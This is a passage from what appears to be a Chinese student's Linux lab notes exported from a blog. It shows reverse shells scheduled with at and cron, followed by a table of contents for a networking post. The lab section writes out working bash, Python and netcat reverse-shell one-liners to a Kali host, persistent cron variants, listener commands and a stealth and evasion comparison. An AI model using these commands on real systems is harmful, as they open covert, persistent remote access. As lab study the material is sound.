class=\"headerlink\" title=\"2、实验二\"></a>2、实验二</h3><h4 id=\"1-使用一次性计划任务和周期性计划任务反弹shell（5分钟后执行，和每5分钟执行一次），Kali-主机接收，解释命令字的含义\"><a href=\"#1-使用一次性计划任务和周期性计划任务反弹shell（5分钟后执行，和每5分钟执行一次），Kali-主机接收，解释命令字的含义\" class=\"headerlink\" title=\"1.使用一次性计划任务和周期性计划任务反弹shell（5分钟后执行，和每5分钟执行一次），Kali 主机接收，解释命令字的含义\"></a>1.使用一次性计划任务和周期性计划任务反弹shell（5分钟后执行，和每5分钟执行一次），Kali 主机接收，解释命令字的含义</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@wyf 桌面]# <span class=\"built_in\">echo</span> <span class=\"string\">&quot;bash -i &gt;&amp; /dev/tcp/172.16.2.1/1234 0&gt;&amp;1&quot;</span> | at now + 5 min</span><br><span class=\"line\">warning: commands will be executed using /bin/sh</span><br><span class=\"line\">job 4 at Thu Aug  7 16:43:00 2025</span><br><span class=\"line\"><span class=\"comment\">#创建一个一次性计划任务，在5分钟后执行反弹Shell操作 反弹目标：IP为172.16.2.1的Kali主机的1234端口</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>bash -i</code>：启动交互式Bash shell</li>\n<li><code>&amp; /dev/tcp/172.16.2.1/4444</code>：<ul>\n<li><code>&gt;&amp;</code>：将标准输出(stdout)和标准错误(stderr)合并重定向</li>\n<li><code>/dev/tcp/172.16.2.1/4444</code>：建立TCP连接到指定IP和端口（Linux内核特性）</li>\n</ul>\n</li>\n<li><code>0&gt;&amp;1</code>：将标准输入(stdin)重定向到标准输出，实现双向通信</li>\n<li><code>at now + 5 min</code>：通过<code>at</code>命令安排在5分钟后执行</li>\n</ul>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250807165413966.png\" alt=\"image-20250807165413966\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@wyf 桌面]# <span class=\"built_in\">echo</span> <span class=\"string\">&quot;*/5 * * * * bash -c &#x27;bash -i &gt;&amp; /dev/tcp/172.16.2.1/1234 0&gt;&amp;1 &amp;&#x27;&quot;</span> | crontab -</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>1.echo命令输出字符串：”*&#x2F;5 * * * * bash -c ‘bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.16.2.1&#x2F;1234 0&gt;&amp;1 &amp;’” 这个字符串是一个cron作业的格式，包含两部分：</p>\n<ul>\n<li>时间计划：<code>*/5 * * * *</code> 表示每5分钟执行一次</li>\n<li>要执行的命令：<code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/172.16.2.1/1234 0&gt;&amp;1 &amp;&#39;</code></li>\n</ul>\n<p>2.管道符<code>|</code>将echo的输出作为标准输入传递给<code>crontab -</code>命令。</p>\n<p>3.<code>crontab -</code>命令：从标准输入读取内容，并将其设置为当前用户的cron表（替换现有的cron作业）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250807170016204.png\" alt=\"image-20250807170016204\"></p>\n<h4 id=\"2-学习不同的反弹shell方式来完成\"><a href=\"#2-学习不同的反弹shell方式来完成\" class=\"headerlink\" title=\"2.学习不同的反弹shell方式来完成\"></a>2.学习不同的反弹shell方式来完成</h4><h5 id=\"方案-1-使用-Python-反弹-Shell\"><a href=\"#方案-1-使用-Python-反弹-Shell\" class=\"headerlink\" title=\"方案 1: 使用 Python 反弹 Shell\"></a>方案 1: 使用 Python 反弹 Shell</h5><p>一次性计划任务（5 分钟后执行）</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\&quot;172.16.2.1\\&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\&quot;/bin/sh\\&quot;,\\&quot;-i\\&quot;])&#x27;&quot;</span> | at now + 5 min</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Python代码解析</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> socket,subprocess,os</span><br><span class=\"line\"><span class=\"comment\"># 创建TCP socket</span></span><br><span class=\"line\">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\"><span class=\"comment\"># 连接到目标IP:端口（根据图片，目标Kali为172.16.2.1）</span></span><br><span class=\"line\">s.connect((<span class=\"string\">&quot;172.16.2.1&quot;</span>, <span class=\"number\">4444</span>))</span><br><span class=\"line\"><span class=\"comment\"># 文件描述符重定向</span></span><br><span class=\"line\">os.dup2(s.fileno(), <span class=\"number\">0</span>)  <span class=\"comment\"># 标准输入(stdin)</span></span><br><span class=\"line\">os.dup2(s.fileno(), <span class=\"number\">1</span>)  <span class=\"comment\"># 标准输出(stdout)</span></span><br><span class=\"line\">os.dup2(s.fileno(), <span class=\"number\">2</span>)  <span class=\"comment\"># 标准错误(stderr)</span></span><br><span class=\"line\"><span class=\"comment\"># 启动交互式Shell</span></span><br><span class=\"line\">subprocess.call([<span class=\"string\">&quot;/bin/sh&quot;</span>, <span class=\"string\">&quot;-i&quot;</span>])</span><br></pre></td></tr></table></figure>\n\n<p>周期性计划任务（每 5 分钟执行）</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(crontab -l 2&gt;/dev/null; <span class=\"built_in\">echo</span> <span class=\"string\">&quot;*/5 * * * * python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\\\\&quot;172.16.2.1\\\\\\&quot;,5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\\\\&quot;/bin/bash\\\\\\&quot;,\\\\\\&quot;-i\\\\\\&quot;])&#x27;&quot;</span>) | crontab -</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"方案-2-使用-Netcat-反弹-Shell\"><a href=\"#方案-2-使用-Netcat-反弹-Shell\" class=\"headerlink\" title=\"方案 2: 使用 Netcat 反弹 Shell\"></a>方案 2: 使用 Netcat 反弹 Shell</h5><p>一次性计划任务（5 分钟后执行）</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 172.16.2.1 6666 &gt;/tmp/f&quot;</span> | at now + 5 min</span><br></pre></td></tr></table></figure>\n\n<p>周期性计划任务（每 5 分钟执行）</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(crontab -l 2&gt;/dev/null; <span class=\"built_in\">echo</span> <span class=\"string\">&quot;*/5 * * * * bash -c &#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 172.16.2.1 7777 &gt;/tmp/f&#x27;&quot;</span>) | crontab -</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"Kali-主机监听命令\"><a href=\"#Kali-主机监听命令\" class=\"headerlink\" title=\"Kali 主机监听命令\"></a>Kali 主机监听命令</h5><p>为所有方案准备监听：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Python Shell 监听</span></span><br><span class=\"line\">nc -lnvp 4444    <span class=\"comment\"># 一次性任务</span></span><br><span class=\"line\">nc -lnvp 5555    <span class=\"comment\"># 周期性任务</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Netcat Shell 监听</span></span><br><span class=\"line\">nc -lnvp 6666    <span class=\"comment\"># 一次性任务</span></span><br><span class=\"line\">nc -lnvp 7777    <span class=\"comment\"># 周期性任务</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"方案对比表\"><a href=\"#方案对比表\" class=\"headerlink\" title=\"方案对比表\"></a>方案对比表</h5><table>\n<thead>\n<tr>\n<th>特性</th>\n<th>Python 方案</th>\n<th>Netcat 方案</th>\n<th>Bash 方案</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>依赖要求</td>\n<td>需要 Python3</td>\n<td>需要 netcat</td>\n<td>仅需 Bash</td>\n</tr>\n<tr>\n<td>防火墙规避</td>\n<td>★★★ (直接 TCP)</td>\n<td>★★ (标准连接)</td>\n<td>★★ (标准连接)</td>\n</tr>\n<tr>\n<td>检测难度</td>\n<td>较难 (非标准方式)</td>\n<td>中等</td>\n<td>较易</td>\n</tr>\n<tr>\n<td>适用系统</td>\n<td>Python 环境</td>\n<td>nc 工具环境</td>\n<td>所有 Linux</td>\n</tr>\n<tr>\n<td>命令隐蔽性</td>\n<td>高</td>\n<td>中</td>\n<td>低</td>\n</tr>\n</tbody></table>\n","feature":true,"text":"网络管理一、基本概念1、物理网卡（NIC, Network Interface Card）​ 硬件实体：插在主板或扩展槽上的设备（如 Intel千兆网卡、Rea...","permalink":"/post/网络管理","photos":[],"count_time":{"symbolsCount":"18k","symbolsTime":"16 mins."},"categories":[],"tags":[{"name":"Linux","slug":"Linux","count":14,"path":"api/tags/Linux.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86\"><span class=\"toc-text\">网络管理</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%80%E3%80%81%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5\"><span class=\"toc-text\">一、基本概念</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1%E3%80%81%E7%89%A9%E7%90%86%E7%BD%91%E5%8D%A1%EF%BC%88NIC-Network-Interface-Card%EF%BC%89\"><span class=\"toc-text\">1、物理网卡（NIC, Network Interface Card）</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2%E3%80%81%E7%BD%91%E7%BB%9C%E9%80%82%E9%85%8D%E5%99%A8%EF%BC%88Adapter%EF%BC%89\"><span class=\"toc-text\">2、网络适配器（Adapter）</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#3%E3%80%81DHCP%EF%BC%88Dynamic-Host-Configuration-Protocol%EF%BC%89%E5%8A%A8%E6%80%81%E4%B8%BB%E6%9C%BA%E9%85%8D%E7%BD%AE%E5%8D%8F%E8%AE%AE\"><span class=\"toc-text\">3、DHCP（Dynamic Host Configuration Protocol）动态主机配置协议</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#1-%E6%A0%B8%E5%BF%83%E5%8A%9F%E8%83%BD\"><span class=\"toc-text\">1.核心功能</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#2-%E5%85%B8%E5%9E%8B%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF\"><span class=\"toc-text\">2.典型应用场景</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#4%E3%80%81%E9%9D%99%E6%80%81%E5%9C%B0%E5%9D%80%EF%BC%88Static-IP-Address%EF%BC%89\"><span class=\"toc-text\">4、静态地址（Static IP Address）</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#1-%E6%A0%B8%E5%BF%83%E7%89%B9%E5%BE%81\"><span class=\"toc-text\">1.核心特征</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#2-%E5%85%B8%E5%9E%8B%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF-1\"><span class=\"toc-text\">2.典型应用场景</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#5%E3%80%81DNS%EF%BC%88Domain-Name-System%EF%BC%89%E5%9F%9F%E5%90%8D%E7%B3%BB%E7%BB%9F\"><span class=\"toc-text\">5、DNS（Domain Name System）域名系统</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#1-%E6%A0%B8%E5%BF%83%E5%8A%9F%E8%83%BD-1\"><span class=\"toc-text\">1.核心功能</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#2-%E5%85%B8%E5%9E%8B%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF-2\"><span class=\"toc-text\">2.典型应用场景</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#6%E3%80%81linux%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%BD%91%E7%BB%9C%E6%8E%A5%E5%8F%A3%E7%B1%BB%E5%9E%8B%E5%8F%8A%E7%BC%A9%E5%86%99%E6%A0%87%E8%AF%86%E8%A7%A3%E6%9E%90\"><span class=\"toc-text\">6、linux中常见网络接口类型及缩写标识解析</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#7%E3%80%81Windows-%E4%B8%AD%E7%9A%84%E2%80%9C%E7%BD%91%E7%BB%9C%E9%80%82%E9%85%8D%E5%99%A8%E2%80%9D%E5%88%86%E7%B1%BB\"><span class=\"toc-text\">7、Windows 中的“网络适配器”分类</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#8%E3%80%81%E8%B7%AF%E7%94%B1%E8%BD%AC%E5%8F%91\"><span class=\"toc-text\">8、路由转发</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#1-%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5\"><span class=\"toc-text\">1.核心概念</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#2-%E8%B7%AF%E7%94%B1%E8%BD%AC%E5%8F%91%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B\"><span class=\"toc-text\">2.路由转发的工作流程</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%EF%BC%881%EF%BC%89%E6%8E%A5%E6%94%B6%E6%95%B0%E6%8D%AE%E5%8C%85%EF%BC%9A\"><span class=\"toc-text\">（1）接收数据包：</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%EF%BC%882%EF%BC%89%E8%B7%AF%E7%94%B1%E8%A1%A8%E6%9F%A5%E8%AF%A2%EF%BC%9A\"><span class=\"toc-text\">（2）路由表查询：</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%EF%BC%883%EF%BC%89%E6%95%B0%E6%8D%AE%E5%8C%85%E8%BD%AC%E5%8F%91%EF%BC%9A\"><span class=\"toc-text\">（3）数据包转发：</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%EF%BC%884%EF%BC%89%E9%80%92%E5%BD%92%E8%BD%AC%E5%8F%91%EF%BC%9A\"><span class=\"toc-text\">（4）递归转发：</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#3-%E8%B7%AF%E7%94%B1%E8%BD%AC%E5%8F%91%E7%9A%84%E5%85%B3%E9%94%AE%E5%9C%BA%E6%99%AF\"><span class=\"toc-text\">3.路由转发的关键场景</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%EF%BC%881%EF%BC%89%E5%86%85%E9%83%A8%E7%BD%91%E7%BB%9C%E8%AE%BF%E9%97%AE%E5%A4%96%E9%83%A8%E7%BD%91%E7%BB%9C\"><span class=\"toc-text\">（1）内部网络访问外部网络</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%EF%BC%882%EF%BC%89%E6%95%B0%E6%8D%AE%E4%B8%AD%E5%BF%83%E6%B5%81%E9%87%8F%E8%B0%83%E5%BA%A6\"><span class=\"toc-text\">（2）数据中心流量调度</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%EF%BC%883%EF%BC%89VPN-%E9%9A%A7%E9%81%93\"><span class=\"toc-text\">（3）VPN 隧道</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#4-%E8%B7%AF%E7%94%B1%E8%BD%AC%E5%8F%91%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">4.路由转发的配置方法</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%EF%BC%881%EF%BC%89Linux-%E7%B3%BB%E7%BB%9F%EF%BC%88%E4%BD%BF%E7%94%A8-ip-%E5%91%BD%E4%BB%A4%EF%BC%89\"><span class=\"toc-text\">（1）Linux 系统（使用 ip 命令）</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%EF%BC%882%EF%BC%89-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%8C%81%E4%B9%85%E5%8C%96\"><span class=\"toc-text\">（2） 配置文件持久化</span></a></li></ol></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E3%80%81%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E6%96%B9%E5%BC%8F\"><span class=\"toc-text\">二、虚拟机的网络连接方式</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1%E3%80%81NAT%EF%BC%88-%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%EF%BC%89\"><span class=\"toc-text\">1、NAT（ 网络地址转换）</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">工作原理</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#1-%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%A7%81%E6%9C%89%E7%BD%91%E7%BB%9C%EF%BC%9A\"><span class=\"toc-text\">1.虚拟机的私有网络：</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#2-%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AF%B7%E6%B1%82%E5%A4%96%E9%83%A8%E7%BD%91%E7%BB%9C%EF%BC%9A\"><span class=\"toc-text\">2.虚拟机请求外部网络：</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#3-%E4%B8%BB%E6%9C%BA%E8%BF%9B%E8%A1%8C-NAT-%E8%BD%AC%E6%8D%A2%EF%BC%9A\"><span class=\"toc-text\">3.主机进行 NAT 转换：</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#4-%E6%95%B0%E6%8D%AE%E5%8C%85%E5%8F%91%E9%80%81%E8%87%B3%E5%A4%96%E9%83%A8%E7%BD%91%E7%BB%9C%EF%BC%9A\"><span class=\"toc-text\">4.数据包发送至外部网络：</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#5-%E5%A4%96%E9%83%A8%E7%BD%91%E7%BB%9C%E5%93%8D%E5%BA%94%E6%95%B0%E6%8D%AE%EF%BC%9A\"><span class=\"toc-text\">5.外部网络响应数据：</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#6-%E4%B8%BB%E6%9C%BA%E5%B0%86%E6%95%B0%E6%8D%AE%E5%8C%85%E8%BD%AC%E5%8F%91%E7%BB%99%E8%99%9A%E6%8B%9F%E6%9C%BA%EF%BC%9A\"><span class=\"toc-text\">6.主机将数据包转发给虚拟机：</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2%E3%80%81%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F%EF%BC%88%E7%8B%AC%E7%AB%8B%E4%B8%BB%E6%9C%BA%EF%BC%89\"><span class=\"toc-text\">2、桥接模式（独立主机）</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86-1\"><span class=\"toc-text\">工作原理</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#1-%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%EF%BC%9A\"><span class=\"toc-text\">1.网络连接：</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#2-%E8%8E%B7%E5%8F%96-IP-%E5%9C%B0%E5%9D%80%EF%BC%9A\"><span class=\"toc-text\">2.获取 IP 地址：</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#3-%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82%E9%80%9A%E4%BF%A1%EF%BC%9A\"><span class=\"toc-text\">3.数据链路层通信：</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#3%E3%80%81%E4%B8%BB%E6%9C%BA%E6%A8%A1%E5%BC%8F%EF%BC%88%E5%AD%90%E4%B8%BB%E6%9C%BA%EF%BC%89\"><span class=\"toc-text\">3、主机模式（子主机）</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86-2\"><span class=\"toc-text\">工作原理</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#1-%E8%99%9A%E6%8B%9F%E7%BD%91%E7%BB%9C%E9%80%82%E9%85%8D%E5%99%A8%EF%BC%9A\"><span class=\"toc-text\">1.虚拟网络适配器：</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#2-IP-%E5%9C%B0%E5%9D%80%E5%88%86%E9%85%8D%EF%BC%9A\"><span class=\"toc-text\">2.IP 地址分配：</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#3-%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%EF%BC%9A\"><span class=\"toc-text\">3.数据传输：</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%89%E3%80%81%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE\"><span class=\"toc-text\">三、网络配置</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1%E3%80%81%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1-%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86%E5%99%A8%EF%BC%88NetworkManager%EF%BC%89\"><span class=\"toc-text\">1、网络服务-网络管理器（NetworkManager）</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2%E3%80%81%E9%85%8D%E7%BD%AE%E7%BD%91%E7%BB%9C%E7%9A%84%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">2、配置网络的方法</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%EF%BC%9Avim\"><span class=\"toc-text\">配置文件：vim</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%9A-nmcli\"><span class=\"toc-text\">命令行： nmcli</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%9B%BE%E5%BD%A2%E9%85%8D%E7%BD%AE\"><span class=\"toc-text\">图形配置</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#3%E3%80%81%E9%85%8D%E7%BD%AE%E7%BD%91%E7%BB%9C%E5%8F%82%E6%95%B0\"><span class=\"toc-text\">3、配置网络参数</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#1-%E7%BA%AF%E5%91%BD%E4%BB%A4%E8%A1%8C%E9%85%8D%E7%BD%AE%E9%9D%99%E6%80%81-IP%EF%BC%88%E6%97%A0%E9%9C%80%E4%BE%9D%E8%B5%96-NetworkManager-%E6%88%96-systemd-networkd-%EF%BC%8C%E9%87%8D%E5%90%AF%E5%A4%B1%E6%95%88%EF%BC%89\"><span class=\"toc-text\">1.纯命令行配置静态 IP（无需依赖 NetworkManager 或  systemd-networkd ，重启失效）</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%EF%BC%881%EF%BC%89%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%BD%91%E7%BB%9C%E7%8A%B6%E6%80%81\"><span class=\"toc-text\">（1）查看当前网络状态</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%EF%BC%882%EF%BC%89%E6%89%8B%E5%8A%A8%E5%88%86%E9%85%8D%E9%9D%99%E6%80%81-IP\"><span class=\"toc-text\">（2）手动分配静态 IP</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%EF%BC%883%EF%BC%89%E8%AE%BE%E7%BD%AE%E9%BB%98%E8%AE%A4%E7%BD%91%E5%85%B3\"><span class=\"toc-text\">（3）设置默认网关</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%EF%BC%884%EF%BC%89-%E9%85%8D%E7%BD%AE-DNS-%E6%9C%8D%E5%8A%A1%E5%99%A8\"><span class=\"toc-text\">（4） 配置 DNS 服务器</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%EF%BC%885%EF%BC%89%E9%87%8D%E5%90%AF%E4%B8%8D%E5%A4%B1%E6%95%88%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88\"><span class=\"toc-text\">（5）重启不失效的解决方案</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#2-%E4%BF%AE%E6%94%B9%E7%BD%91%E5%8D%A1%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6-etc-sysconfig-netword-scripts-ifcfg-ensxx\"><span class=\"toc-text\">2.修改网卡的配置文件 &#x2F;etc&#x2F;sysconfig&#x2F;netword-scripts&#x2F;ifcfg-ensxx</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%EF%BC%881%EF%BC%89%E5%85%88%E5%A4%87%E4%BB%BD%E7%BD%91%E5%8D%A1%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%EF%BC%8C%E5%9C%A8%E4%BF%AE%E6%94%B9\"><span class=\"toc-text\">（1）先备份网卡配置信息，在修改</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%EF%BC%882%EF%BC%89%E7%BC%96%E8%BE%91%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%EF%BC%8C%E6%AF%8F%E4%B8%AA%E5%8F%82%E6%95%B0%E9%83%BD%E8%A6%81%E8%83%8C%E4%B8%8B%E6%9D%A5%EF%BC%81%EF%BC%81%EF%BC%81\"><span class=\"toc-text\">（2）编辑配置文件，每个参数都要背下来！！！</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%EF%BC%883%EF%BC%89%E9%87%8D%E5%90%AF%E5%90%8E%E9%AA%8C%E8%AF%81\"><span class=\"toc-text\">（3）重启后验证</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#3-nmcli-%E5%91%BD%E4%BB%A4%E9%85%8D%E7%BD%AEIP%EF%BC%88%E5%9F%BA%E4%BA%8ENetworkManager%E7%9A%84%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%89-network-etc-sysconfig-network-scripts-ifcfg-ensxx\"><span class=\"toc-text\">3.nmcli 命令配置IP（基于NetworkManager的管理工具） network &#x2F;etc&#x2F;sysconfig&#x2F;network scripts&#x2F;ifcfg-ensxx</span></a><ol class=\"toc-child\"><li class=\"toc-item 